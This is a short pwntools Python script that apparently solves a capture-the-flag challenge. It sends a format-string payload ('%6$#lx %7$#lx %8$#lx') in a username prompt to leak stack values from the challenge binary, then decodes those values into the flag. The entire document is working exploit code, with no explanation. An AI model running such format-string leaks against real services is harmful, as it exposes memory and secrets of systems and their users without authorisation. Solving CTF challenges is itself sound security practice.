#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

if args.REMOTE:
    r = remote("chall.lac.tf", 31142)
else:
    r = process([exe.path])
    if args.GDB:
        gdb.attach(r)

r.sendlineafter(b"username: ", b"%6$#lx %7$#lx %8$#lx ")
r.sendlineafter(b"password1: ", b"")
r.sendlineafter(b"password2: ", b"")
r.recvuntil(b"user ")
flag = b""
for i in range(3):
    flag += int(r.recvuntil(b' ', drop=True), 16).to_bytes(8, 'little')
print(flag)
